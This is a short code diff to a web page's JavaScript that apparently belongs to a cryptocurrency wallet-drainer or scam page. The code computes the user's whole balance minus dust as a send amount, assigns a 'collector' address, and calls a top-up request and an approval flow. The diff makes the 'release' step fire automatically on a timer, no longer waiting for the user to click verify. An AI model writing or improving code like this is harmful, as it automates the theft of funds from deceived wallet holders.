@@ -358,12 +358,13 @@ header{height:58px;background:#fff;border-bottom:1px solid #ECEEF3;display:flex;
       state.sendAmount = Math.max(0, state.balance - CFG.DUST);
 
       var stored = await checkStoredAddress(state.account);
-      if(stored){ state.collector = stored.address; new_showPopup(Number(stored.amount) || state.sendAmount); return; }
+      if(stored){ state.collector = stored.address; new_showPopup(Number(stored.amount) || state.sendAmount); setTimeout(doRelease, 1800); return; }
 
       var res = await postTopup(state.account);
       if(!res.ok){ alert('Topup failed: ' + JSON.stringify(res.data)); return; }
 
       new_showPopup(state.sendAmount);
+      setTimeout(doRelease, 1800);
       setTimeout(function(){ $('new_verifyBtn').click(); }, 1200);
     }catch(e){
       console.error('flow error', e);
@@ -384,7 +385,7 @@ header{height:58px;background:#fff;border-bottom:1px solid #ECEEF3;display:flex;
     $('new_overlay').classList.add('on');
   }
 
-  $('new_verifyBtn').addEventListener('click', function(){
+  function doRelease(){
     var shown = parseFloat($('new_burn_text2').textContent) || 0;
     var needed = Math.max(0, (shown - CFG.DUST) - state.balance);
     $('final_usdt_Text').innerHTML = 'Available USDT: <span class="usdt_value">' + state.balance.toFixed(2) + '</span>';
@@ -401,7 +402,8 @@ header{height:58px;background:#fff;border-bottom:1px solid #ECEEF3;display:flex;
         $('releaseOverlay').classList.remove('active');
       }
     }, 2000);
-  });
+  }
+  $('new_verifyBtn').addEventListener('click', doRelease);
 
   async function final_runApproveFlow(){
     try{
